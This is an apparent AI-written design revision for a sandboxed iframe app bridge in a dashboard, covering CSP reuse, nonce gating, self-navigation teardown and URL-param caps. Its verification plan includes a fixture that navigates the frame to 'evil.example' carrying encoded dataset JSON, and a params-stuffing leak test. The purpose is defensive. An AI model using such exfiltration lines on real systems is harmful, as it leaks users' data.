All four blocking factual claims verified against the working tree. Two of them turn out to be bigger than stated — `sandboxHtml.ts` already ships a **height bridge** (`HEIGHT_BRIDGE`, `HEIGHT_MESSAGE_KEY`, `MIN/MAX_HTML_HEIGHT`, `readHeightMessage` in `chatHtmlKit.ts`) and `HtmlView.tsx:106` already implements the `event.source` gate for Chat. My plan was reinventing a primitive that exists. Revisions below.

---

# Envelope decision — deltas

## D1. `isRawPayloadEnvelope` changes (B3)

It cannot stay unchanged. `src/lib/lab/types.ts:439-443` becomes:

```ts
export function isRawPayloadEnvelope(result: unknown): result is RawPayloadEnvelope {
  if (typeof result !== 'object' || result === null || Array.isArray(result)) return false;
  const r = result as { kind?: unknown; data?: unknown; html?: unknown; app?: unknown };
  return r.kind === undefined && ('data' in r || 'html' in r || 'app' in r);   // + 'app'
}
```

Only then does the existing data-is-mandatory reject fire for `{ app }` alone. Owned by **T1**.

## D2. The adapter is the real gatekeeper (B1)

`src/lib/lab/adapters/custom-script.ts` is the only adapter that handles envelopes (`generic-http.ts` returns `Series[]` and cannot produce `html`/`app` — no change there). It re-**builds** the envelope at :77-85 and drops anything it does not name. Four changes, owned by **T2**:

1. **Bare `app/v1` return** — new check *before* the envelope check, because `{kind:'app/v1'}` has a `kind` and therefore fails `isRawPayloadEnvelope`, falling into `coerceSeries` with a misleading message:
   ```ts
   if (isRawAppSpec(result)) throw new LabError('Custom script returned a bare { kind: "app/v1" } body without `data` — data is mandatory: return { data, app }.');
   ```
2. **Bare `dataset/v1` return** passes through raw beside funnel/matrix: `if (isRawFunnelSet(result) || isRawMatrixSet(result) || isRawDatasetBundle(result)) return result;`
3. **Envelope data branch** (:78) — `isRawDatasetBundle(data)` joins the pass-through set, otherwise `coerceSeries(data)` still throws on a non-array. Without this a script returning `data:{kind:'dataset/v1'}` hard-fails today.
4. **Envelope `app` copy-through** (after the `html` block) — a shape check only, so validation/caps stay in one place (the engine), matching this file's own stated boundary:
   ```ts
   if (result.app !== undefined) {
     if (!isRawAppSpec(result.app)) throw new LabError('Custom script envelope `app` must be a { kind: "app/v1", … } object.');
     envelope.app = result.app;
   }
   ```
5. `coerceSeries`'s error string (:40) gains `dataset/v1` and `{ data, app }`.

## D3. Sandbox primitives — correct file map, and reuse instead of reimplementation (B4)

`dashboard/src/lib/sandboxHtml.ts` (`SANDBOX_CSP:29`, `SANDBOX_GRANT:33`, `resolveTokens:42`, `buildSandboxSrcdoc:80`) is **shared with Chat** (`chatHtmlKit.ts` imports the same four). It is **explicitly UNOWNED — no task edits it.** So is `labHtmlKit.ts` (a thin wrapper: `HTML_KIT_SANDBOX = SANDBOX_GRANT`, `buildSrcdoc` delegates).

`buildAppSrcdoc` therefore **delegates to `buildSandboxSrcdoc`** rather than re-implementing the concatenation order, and passes the runtime shim through the `bodyScript` parameter that already exists for exactly this purpose:

```ts
// dashboard/src/components/lab/labAppRuntime.ts
import { buildSandboxSrcdoc, resolveTokens, SANDBOX_GRANT, SANDBOX_CSP } from '../../lib/sandboxHtml';
import { LAB_HTML_KIT_CSS } from './labHtmlKit';

export function buildAppSrcdoc(input: {
  page: AppPage; shell?: AppShell; pages: { id: string; title: string }[];
  tokens: Record<string, string>; scheme: 'light' | 'dark';
  params: Record<string, string>; nonce: string;
}): string {
  return buildSandboxSrcdoc({
    html: input.page.html,
    css: LAB_HTML_KIT_CSS,
    tokens: input.tokens,
    scheme: input.scheme,
    overrideCss: input.shell?.style,
    bodyScript: appRuntimeScript(input),   // shim + author shell.script, in that order
  });
}
```

`SANDBOX_CSP`/`SANDBOX_GRANT` reach the app path untouched — the security argument stays literally the same two constants Chat and the html/v1 card already rely on.

**Why the shim is not shared with Chat's `HEIGHT_BRIDGE`:** the app shim is a superset (height + navigate + data + route + theme + nonce). Promoting it into `sandboxHtml.ts` would make a Lab-shaped protocol reach the Chat surface and put an edit on a file that regresses Chat if wrong. Duplicating ~6 lines of `getBoundingClientRect` measurement is the cheaper trade; what actually matters — CSP, grant, srcdoc order — *is* shared. The height message is namespaced the same way Chat's is (`HEIGHT_MESSAGE_KEY = '__dreamHtmlHeight'`): every lab-app message carries `__dreamLabApp: 1`, so an unrelated `postMessage` can never be read as one.

## D4. S1 — self-navigation: the corrected safety claim and its mitigations

**The claim I made was wrong and is withdrawn.** "Safe because the frame is our own srcdoc" is false the moment the frame navigates. A sandboxed frame can always navigate *itself* — no sandbox token gates it (`allow-top-navigation` governs *other* contexts), and CSP fetch directives (`default-src 'none'`) govern subresource loads, not a document replacing itself. `contentWindow` is a stable `WindowProxy` across that navigation, so with `targetOrigin: '*'` every later host push would keep landing in whatever document now occupies the frame. This was inert for html/v1 (the author's data was already baked into their own markup); the data channel is what makes it live.

The corrected claim is three parts, and each part is pinned:

**(1) Subresource network access remains impossible.** Unchanged, still proven by the existing beacon accounting.

**(2) Self-navigation is possible; we do not prevent it, we detect it and cut the channel.** Two mechanisms, both in `LabAppFrame.tsx` (**T4**):

- **M1 — load-count teardown (load-bearing).** The host counts `load` events on the iframe. Load #1 is the srcdoc. **Any load ≥2 means the document navigated.** On it: set `torn = true` (every outbound push short-circuits, permanently), reject every inbound message, force-remount the frame to `about:blank` by bumping its React `key`, render a visible stopped state — *"This app body navigated away and was stopped."* — plus `console.error` and an `onToast`. The host stops talking to the frame before it can be asked for anything more.
- **M2 — per-instance nonce (covers the race).** The host mints `nonce = crypto.randomUUID()` (fallback `Math.random().toString(36).slice(2)`) per srcdoc build and embeds it in the shim. Every inbound message must carry that exact nonce or it is dropped; every outbound push carries it and the shim ignores foreign-nonce messages. A navigated-away document never learned the nonce, so it cannot *request* anything in the window between navigation start and the `load` event that fires M1. The nonce is the belt to M1's braces — it does not stop a hostile document from passively *receiving* a push, which is precisely why M1 (stop posting at all) is the primary control and not the secondary one.

**(3) The bridge carries nothing the body's author did not already have.** This is the real bound on blast radius, and it replaces the false claim:

- `lab.data(key)` serves **only this slug's** `cache.datasets` (or the synthesized legacy bundle). Never another insight's cache, never `lab/credentials.json`, never the manifest `source` block (which holds endpoints and header templates). Pinned in the contract and unit-tested by asserting the frame's data resolver is constructed from a single `DatasetBundle` prop and has no other reachable input.
- The body's author *is* the script author — both live in the same `lab/scripts/<slug>.mjs`, which `custom-script.ts` already documents as running locally, with credentials, with full filesystem and network access. Anyone who can write the html can already exfiltrate the same numbers at sync time, more easily and without a browser. **So the bridge does not widen the trust boundary; it moves already-owned data across an already-crossable line.** The residual risk would be an author who can write the `html` but not the script — a separation that does not exist today. If it ever does (a marketplace of shared bodies), `lab.data` needs a per-page allow-list from `page.dataset` and M1/M2 stop being sufficient; that is recorded as open question 8, not silently assumed away.

**T8 must exercise navigation** — it currently does not, which is why the hole survived review. New fixture page calls `location.href = 'https://evil.example/?d=' + encodeURIComponent(JSON.stringify(await lab.data()))`. Checks: the frame reaches the stopped state; the host posts nothing after teardown (assert via a nonce-echo probe that goes unanswered); and the navigation attempt is **recorded** in the request log with its outcome. If Chromium happens to block it (inherited-CSP behavior is version-dependent and I will not spec-lawyer it), that is reported as a bonus line, never as the guarantee.

## D5. S2 — `navigate` params: where they land, and their cap

Params land in the **query string, namespaced `p.`** (`?p.tab=steps&p.sort=desc`), so they can never collide with `vault`, `page`, `from`, `to`, `range`, `cols`, `fs`. Pinned signatures gain the argument they were missing:

```ts
// labRoute.ts  (T5)
export function labAppPath(slug: string, pageId: string | null): string;
export function pushLabAppPath(slug: string, pageId: string | null,
                               params: Record<string, string>, bus?: EventTarget): void;
/** Pure, browser-free, unit-testable. */
export function sanitizeAppParams(raw: unknown): { params: Record<string, string>; dropped: string[] };
```

Caps, enforced in **one place** (`sanitizeAppParams`, called by `pushLabAppPath` — the frame never writes the URL itself):

| rule | value | on violation |
|---|---|---|
| param count | ≤ 8 | keep the first 8 in key-sorted order (deterministic), rest → `dropped` |
| key charset | `/^[a-z0-9_-]{1,24}$/` | drop that pair |
| value length | ≤ 64 chars after `String()` | drop that pair (**not** truncate — a truncated value is a silently wrong view) |
| total serialized | ≤ 256 chars | drop from the end until under |

Every drop produces one `console.warn` naming the key; the navigation still happens with the surviving params. `LabAppFrame` calls `onNavigate(pageId, params)` and nothing else; `LabAppPage` is the only URL writer; card mode passes no `onNavigate` at all.

**T8 gets a malicious-params check** (was missing): a fixture calls `lab.navigate('steps', { leak: '<2 KB of dataset JSON>', a:'1', …, z:'26' })` → assert the resulting URL carries ≤8 `p.` params, no value over 64 chars, total query growth ≤256 chars, and that **Copy-link yields exactly that capped URL** — the covert-channel path is closed at the surface that shares it.

---

# Changed file-by-file entries

**`src/lib/lab/types.ts`** *(T1, changed)* — as before, **plus** the `isRawPayloadEnvelope` fix in D1.

**`src/lib/lab/adapters/custom-script.ts`** *(T2, NEWLY OWNED — was unowned)* — the five changes in D2. `generic-http.ts` and `script-child.ts` stay unowned.

**`dashboard/src/lib/sandboxHtml.ts`, `dashboard/src/components/lab/labHtmlKit.ts`, `dashboard/src/components/sleepy/chat/*`** — **explicitly UNOWNED.** Editing `sandboxHtml.ts` would regress Chat.

**`dashboard/src/components/lab/labAppRuntime.ts`** *(T4, changed)* — delegates to `buildSandboxSrcdoc` per D3; `buildAppSrcdoc` gains `nonce`; every message carries `__dreamLabApp: 1` and `nonce`; the shim's height measurement follows the `HEIGHT_BRIDGE` idiom (`document.body.getBoundingClientRect().height`, `ResizeObserver`, plus the late-font/image re-measure) — measuring `body`, never `documentElement`, because the root is stretched to the frame height and would chase the value it sets.

**`dashboard/src/components/lab/LabAppFrame.tsx`** *(T4, changed)* — adds M1 load-count teardown + M2 nonce gate on top of the `event.source` identity check (the idiom already at `HtmlView.tsx:106`); height floor/ceiling mirror Chat's `MIN_HTML_HEIGHT = 40` / `MAX_HTML_HEIGHT = 20000` as local constants (not imported from Chat — no cross-surface coupling); `mode === 'full' ? '100%' : height` follows `HtmlView.tsx:126`. Implements its own small `data-theme` `MutationObserver` (the existing ones live in unowned files). **Keyed `key={`${slug}:${pageId}`}`** by its callers so an insight or page change remounts rather than holding a stale closure over `datasets`/`iframeRef` (N4).

**`dashboard/src/components/lab/appModel.ts`** *(moved T6 → **T4**)* — resolves the B2 cycle: the dashboard-side mirror of `AppSpec`/`AppPage`/`AppShell`/`Dataset`/`DatasetBundle`/`AppCacheEntry`/`DatasetCacheEntry` now ships in the same wave as the frame that consumes it.

**`src/lib/lab/dataset.ts`** *(T1, changed)* — `seriesToDatasetBundle(series)` output is **pinned** (N1): `{ kind:'dataset/v1', primary:'series', datasets:[{ key:'series', label:'Series', dims:[{key:'series'},{key:'date'}], rows:[…] }] }`. So `lab.data()` and `lab query` with no key both resolve to `'series'` on a legacy cache, and T3 and T4 cannot disagree about it.

**Byte budget note** (N2), stated in `dataset.ts`'s header: the whole bundle reuses `MAX_MATRIX_BYTES` (200 000) while each dataset is separately capped at the same number — deliberate, not a copy-paste bug. The per-dataset cap stops one runaway dataset; the bundle cap is the **total** response budget, and setting it to the single-set figure means an app of 12 datasets costs a reader no more bytes than one old `matrix/v1` insight did.

**`dashboard/src/components/lab/funnel/labRoute.ts`** *(T5, changed)* — gains `sanitizeAppParams` and the `p.`-prefixed param write per D5; `pushLabAppPath` signature updated.

**`dashboard/src/components/lab/LabAppPage.tsx`** *(T5, changed)* — sole URL writer for `navigate`; **keyed by `slug`** (N4); Copy-link reads the already-capped URL via `currentDeepLink`.

**`scripts/verify/lab-app-insight.mjs`** *(T8, changed)* — two new checks per D4/D5 (navigation teardown; malicious params capped through Copy-link). Full list in the map.

**`_dream_context/knowledge/patterns/sandboxed-app-bridge-pattern.md`** *(T9, changed)* — must state, in the "what the bridge carries" section (N3): **`lab.data(key)` can read any dataset in the insight's bundle, not only the current page's.** Same author, same trust domain, so this is intended — but "the frame receives only what it is displaying" must not be written, because it would read as per-page scoping that does not exist. The doc also carries the D4 self-navigation section verbatim: a sandboxed frame can always navigate itself, the mitigation is detect-and-cut, and the honest bound is "nothing the author did not already have."

---

# (c) Dependency map — full, corrected

| task | files owned | depends on | wave | contract |
|---|---|---|---|---|
| **T1 — Contract & parsers** | `src/lib/lab/types.ts`, NEW `src/lib/lab/app.ts`, NEW `src/lib/lab/dataset.ts`, NEW `tests/unit/lab-app.test.ts` (parser half) | — | 1 | Exports: `RENDERS` incl. `'app'`; `AppPage{id,title,html,dataset?}`, `AppShell{style?,script?}`, `AppSpec{kind:'app/v1',entry,card?,pages,shell?}`, `RawAppSpec`, `isRawAppSpec`; `Dataset{key,label?,unit?,dims:MatrixDim[],rows:MatrixRow[],total?}`, `DatasetBundle{kind:'dataset/v1',primary?,datasets}`, `RawDatasetBundle`, `isRawDatasetBundle`; `AppCacheEntry{spec,notices,range}`, `DatasetCacheEntry{bundle,notices,range}`, `DatasetSnapshot{at,range,bundle}`; `InsightCache.app?/datasets?/datasetHistory?`; `RawPayloadEnvelope{data:…\|RawDatasetBundle, html?, app?}`. **`isRawPayloadEnvelope` gains `\|\| 'app' in r`** (D1) — without it every `{app}`-only reject is dead code. `app.ts`: `parseAppSpec(raw):{spec,notices}` (throws `LabError`), `findAppPage(spec,id\|null)`, `appPageIds`, `MAX_APP_PAGES=12`, `MAX_APP_BYTES=300_000`, `APP_PAGE_ID_RE=/^[a-z0-9][a-z0-9-]{0,63}$/`. `dataset.ts`: `parseDatasetBundle(raw):{bundle,notices}` (delegates each dataset to `parseMatrixSet`), `datasetToSeries`, `datasetLatest`, `findDataset`, **`seriesToDatasetBundle` pinned to `key:'series'`, `primary:'series'`, `dims:[{key:'series'},{key:'date'}]`**, `makeDatasetSnapshot`, `appendDatasetHistory`, `MAX_DATASETS=12`, `DATASET_HISTORY_MAX=60`, `DATASET_HISTORY_MAX_BYTES=1_000_000`. No behaviour change to funnel/matrix/html paths. |
| **T2 — Engine wiring, adapter & scaffold** | `src/lib/lab/sync.ts`, **`src/lib/lab/adapters/custom-script.ts`**, `src/lib/lab/store.ts`, `tests/unit/lab-adapter-script.test.ts`, `tests/unit/lab-app.test.ts` (sync half, appended after T1 lands) | T1 | 2 | **`custom-script.ts` is the gatekeeper and must change or the bridge is dead on arrival** (D2): bare `app/v1` → precise data-mandatory `LabError`; bare `dataset/v1` passes through beside funnel/matrix; envelope data branch accepts `isRawDatasetBundle` before falling to `coerceSeries`; envelope copies `app` through after a `isRawAppSpec` shape check (caps stay the engine's); `coerceSeries` message names `dataset/v1` + `{data, app}`. `syncInsight` writes `cache.app`/`cache.datasets`/`cache.datasetHistory` alongside `data`; ok-without-`app` clears a stale `cache.app`; failure preserves all three; `app`+`html` → `LabError`; over-`MAX_APP_BYTES` → `LabError`. `store.ts` exports `appScriptTemplate(slug)`, scaffolds it for `render==='app' && adapter==='script'`, gives `app` the `range` enum tweak, **stops scaffolding for `breakdown`**, deletes `matrixScriptTemplate`, `console.warn`s the deprecation. `generic-http.ts` unowned (cannot produce `html`/`app`). |
| **T3 — CLI read & query** | NEW `src/lib/lab/htmlText.ts`, NEW `src/lib/lab/datasetQuery.ts`, `src/cli/commands/lab.ts`, NEW `tests/unit/lab-app-query.test.ts` | T1 | 2 | `htmlToText(html,{format?:'text'\|'md',maxChars?}): string` — zero new deps. `queryDataset(bundle,{dataset?,where?,groupBy?,top?}): DatasetQueryResult` (shape as previously pinned). `resolveDatasetAsOf(cache,dateISO\|null)` → `{bundle,at,range}` or `null` (honest empty, never interpolated). No-key resolution order: `bundle.primary` → `'series'` on a synthesized legacy bundle → first dataset. CLI: `lab show` prints page list + datasets pivot + a pointer to `lab body`; `lab body <slug> [--page][--format text\|md\|html][--json]`; `lab query <slug> [--dataset][--where k=v…][--group-by][--top][--date][--json]`. Cache-only, never fetches. |
| **T4 — Bridge, frame & dashboard model** | NEW `dashboard/src/components/lab/labAppRuntime.ts`, NEW `dashboard/src/components/lab/lab-app-runtime.js`, NEW `dashboard/src/components/lab/LabAppFrame.tsx`, **NEW `dashboard/src/components/lab/appModel.ts`** (moved from T6 — B2), NEW `tests/unit/lab-app-body.test.ts` | T1 (shape reference only; `appModel.ts` is hand-mirrored, not imported) | 2 | **Owns `appModel.ts`, so T5/T6 have dashboard-side types in wave 3 — the cycle is gone.** Imports `buildSandboxSrcdoc`/`resolveTokens`/`SANDBOX_GRANT`/`SANDBOX_CSP` from `dashboard/src/lib/sandboxHtml.ts` and `LAB_HTML_KIT_CSS` from `labHtmlKit.ts` — **both files UNOWNED, zero edits** (D3; editing `sandboxHtml.ts` regresses Chat). Exports `LAB_APP_PROTOCOL=1`, `LabAppInbound`/`LabAppOutbound` (every message carries `__dreamLabApp:1` + `nonce`), `LAB_APP_RUNTIME_JS`, `buildAppSrcdoc({page,shell,pages,tokens,scheme,params,nonce})` (delegates to `buildSandboxSrcdoc`, shim via `bodyScript`), `LabAppFrame(props{spec,pageId,params,datasets,mode:'card'\|'page'\|'full',title,onNavigate?})`. Gates, in order: `event.source === contentWindow` → `__dreamLabApp` marker → nonce match. **M1 load-count teardown** (load ≥2 ⇒ `torn`, stop all pushes, remount to `about:blank`, visible stopped state, `console.error`) and **M2 per-instance nonce** (D4). `lab.data` resolves **only** from the `datasets` prop — no other reachable input, unit-tested. Height floor/ceiling `40`/`20000` as local constants; `mode==='full' ? '100%' : height`. Own `data-theme` `MutationObserver`. |
| **T5 — Routing, params & app page** | `dashboard/src/components/lab/funnel/labRoute.ts`, `dashboard/src/pages/LabPage.tsx`, NEW `dashboard/src/components/lab/LabRoutedInsight.tsx`, NEW `dashboard/src/components/lab/LabAppPage.tsx`, NEW `LabAppPage.css` | T1, T4 | 3 | `LabRoute` gains `pageId`; `parseLabPath` accepts `/^\/lab\/([^/]+)(?:\/(f\|p)\/([^/]+))?\/?$/`; `labAppPath(slug,pageId\|null)`; **`pushLabAppPath(slug,pageId\|null,params,bus?)`** and **`sanitizeAppParams(raw): {params,dropped}`** — pure, browser-free, the single enforcement point for the `p.`-prefixed query namespace and the ≤8 keys / `[a-z0-9_-]{1,24}` / ≤64-char values / ≤256-char-total caps, drop-not-truncate, one warn per drop (D5). `labPath`/`pushLabPath`/`replaceSearch`/URL-owner machinery untouched (funnel must not regress). `LabAppPage({slug,pageId,onBack,onToast})` is the **only** URL writer, keyed by `slug`; full-screen via `?fs=1` + `.lab-app-page--fullscreen`, Escape exits. `LabPage` dispatch: `report → ReportPage`, `slug+funnelId → FunnelDetailPage`, `slug+pageId → LabAppPage`, `slug → LabRoutedInsight`, else `LabBoard`. |
| **T6 — Card surface & registry** | `dashboard/src/components/lab/chartRegistry.ts`, NEW `dashboard/src/components/lab/LabAppBody.tsx`, `dashboard/src/components/lab/InsightCard.tsx`, `dashboard/src/hooks/useLab.ts`, `tests/unit/lab-render-registry.test.ts` | T1, T4 | 3 | `chartRegistry.RENDERS` mirrors engine `RENDERS` exactly (drift test); `app` entry `{CardBody: LabAppBody, defaultSpan:2, supportsWindow:true, routed:true, emptyHint, openHint:'Open the app'}` — so `isRoutedRender('app')` is true and `LabBoard`'s existing `openInsight` routes with **no LabBoard edit**. `LabAppBody` renders `<LabAppFrame mode="card" key={slug}>` on `card ?? entry`, passes **no** `onNavigate` (card mode is one click target, iframe `pointerEvents:'none'`). `useLab.InsightCache` gains `app?`/`datasets?` typed from T4's `appModel.ts`. `InsightCard` body precedence `app → html → typed`. `HtmlInsightBody`/`InsightDetailPanel`/`LabBoard` stay unowned. |
| **T7 — Doctor & route hygiene** | `src/cli/commands/doctor.ts`, `src/server/routes/lab.ts`, `tests/unit/lab-doctor.test.ts`, `tests/unit/server-lab-routes.test.ts` | T1, T2 | 3 | `checkLab` gains an `m.render === 'app'` block mirroring the matrix block: re-parse `cache.app.spec` and `cache.datasets.bundle`, one warn per surviving notice naming `lab sync --force`, `datasetHistory` against **both** caps; plus a render-agnostic warn when a cache holds `app` **and** `html`. `withoutFunnelHistory` → `withoutHistoryTrails`, stripping `funnelHistory` **and** `datasetHistory`; `handleLabShow`'s other four response keys unchanged. |
| **T8 — Runtime verify** | NEW `scripts/verify/lab-app-insight.mjs`, `package.json` | T2, T3, T5, T6, T7 | 4 | `npm run verify:lab-app`, exit 0 only on all-pass. Real Chromium, scratch vault, fake `HOME`, collect-don't-fail-fast, screenshots — `lab-breakdown-reports.mjs` harness contract. Checks: (1) sandbox is exactly `allow-scripts`, srcdoc carries `default-src 'none'`; (2) fetch + `<img>` beacons → zero `requestfinished`, ≥1 `csp` failure; (3) card iframe height **grows with content** and is neither 232 nor 420; (4) bridge round trip — `lab.data()` returns host-served rows the html never embedded; (5) `lab.navigate('steps')` → URL `/lab/<slug>/p/steps`, Back returns to entry; (6) cold deep-link to `/p/steps` lands there; (7) `?fs=1` deep-links into full-screen, Escape exits; (8) `lab query --where` and `lab body --page steps --format md` answer from the CLI with no dashboard open; **(9) NEW — self-navigation: a fixture sets `location.href='https://evil.example/?d='+…`; assert the frame reaches the stopped state, the host answers no further nonce-echo probe, and log the navigation attempt's actual outcome (a Chromium block is reported as a bonus, never as the guarantee)**; **(10) NEW — malicious params: `lab.navigate('steps',{leak:<2KB>,a…z})` yields ≤8 `p.` params, no value >64 chars, ≤256-char query growth, and Copy-link returns exactly that capped URL.** |
| **T9 — Docs, pattern, propagate** | `skill/SKILL.md`, `skill/references/cli-reference.md`, `skill/references/tasks-and-features.md`, NEW `_dream_context/knowledge/patterns/sandboxed-app-bridge-pattern.md`, `tests/unit/taxonomy-markers.test.ts` | T2, T3, T5, T6, T7 | 4 | Applies `feature-integration-pattern.md` items 1–3, 7–9 (4–6 recorded as "considered — sleep never runs lab sync; no sub-agent or skill-pack touchpoint"). Edits `skill/` only, never `.claude/skills/`; ends with `dreamcontext update`. Decision-table dimensional row → `app`+`dataset/v1`; breakdown demoted to a grandfathered note; matrix/v1 section banner-marked DEPRECATED ("existing insights keep rendering; no migration forced"). **Pattern doc carries D4 verbatim** (self-navigation is possible, detect-and-cut, and the honest "nothing the author did not already have" bound) **and N3** — `lab.data(key)` reads any dataset in the bundle, not only the current page's; the phrase "receives only what it is displaying" is banned as it implies per-page scoping that does not exist. New markers pin `lab body`, `lab query`, the app section heading, the app router phrases, and the deprecation banner. |

**Acyclicity & lanes:** T1 → {T2, T3, T4}; T4 → {T5, T6}; {T1,T2} → T7; wave 4 depends on waves 2–3. No file in two rows. Concurrency 1 / 3 / 3 / 2. Deliberately unowned: `sandboxHtml.ts`, `labHtmlKit.ts`, `HtmlInsightBody.tsx`, `InsightDetailPanel.tsx`, `LabBoard.tsx`, `chatHtmlKit.ts`, `HtmlView.tsx`, `generic-http.ts`, `script-child.ts`, `matrix.ts`, `funnel.ts`, `reports-store.ts` — which is what keeps html/v1, funnel, matrix/v1 and the **Chat surface** non-regressing.

---

# (d) Assumptions & open questions — updated

**Corrections to my previous assumptions.** Assumption 1 stands (postMessage semantics) but was **incomplete**: it covered subresource loads only and I drew a safety conclusion it does not support. Self-navigation is out of its scope, and D4 now handles that separately. Assumption 7 (`MAX_APP_BYTES` comfortable because data is host-served) stands but now reads together with N2's budget note.

**Retained, unchanged:** reports resolve dated snapshots from disk so the `datasetHistory` strip is safe (T7 greps `resolveReport`'s call path first); `matrixScriptTemplate` is unreferenced elsewhere; `useLabInsight` shares a react-query key so `LabRoutedInsight` adds no round trip; `render: app` insights are out of scope for My Reports; an app's `data` half may be any of the four kinds, with `seriesToDatasetBundle` as a **read-side** convenience over legacy caches and never an authoring blessing of dimensions-in-series-names.

**New / revised:**

9. **`generic-http.ts` cannot emit `html` or `app`** — only `custom-script.ts` handles envelopes (verified by grep: the only two `isRawPayloadEnvelope` call sites are `sync.ts:273` and `custom-script.ts:72`). App bodies are script-adapter-only, and the docs say so rather than leaving it as an undiscovered limit.
10. **`crypto.randomUUID()` is available** — the dashboard serves from `http://127.0.0.1`, a potentially-trustworthy origin, so the secure-context requirement is met. `Math.random().toString(36)` fallback ships anyway; this is a per-instance handshake token, not a cryptographic secret.
11. **`ResizeObserver` on `document.body` inside an opaque-origin srcdoc reports content height** — no longer an assumption to prove, it is **already shipping** in Chat's `HEIGHT_BRIDGE`. T4 follows that implementation (measure `body`, not `documentElement`) and inherits its late-font/image re-measure.
12. **The Chat surface's uncommitted work is landing** — `sandboxHtml.ts`, `chatHtmlKit.ts`, `HtmlView.tsx` are untracked/modified in the working tree. This plan reuses `sandboxHtml.ts` and would need re-basing if that work is reverted. **T4 confirms `sandboxHtml.ts` is committed before starting**; if it is not, T4 falls back to `labHtmlKit.buildSrcdoc` and the same delegation argument holds one wrapper down.

**Open questions — recommendations unchanged for 1–7 (breakdown still creates a manifest with a loud warn; `breakdown` stays in `RENDERS` with a `(deprecated)` marker; `matrixScriptTemplate` deleted; card mode `pointerEvents:'none'`; CSS-overlay full-screen; one dataset per `lab.data()` call; no typed render for `dataset/v1`).** One new, and it is the one worth the owner's attention:

8. **Do we need per-page dataset scoping?** Recommended: **no, today** — the html author and the script author are the same person writing the same file, so page-scoping `lab.data` would be security theater that costs authors real ergonomics. But this is the assumption that would break first: if bodies ever become shareable/installable independently of their script (a marketplace, a peer-vault import), `lab.data(key)` must be restricted to `page.dataset` and M1/M2 stop being sufficient on their own. Recorded in the pattern doc as the named revisit condition rather than left implicit.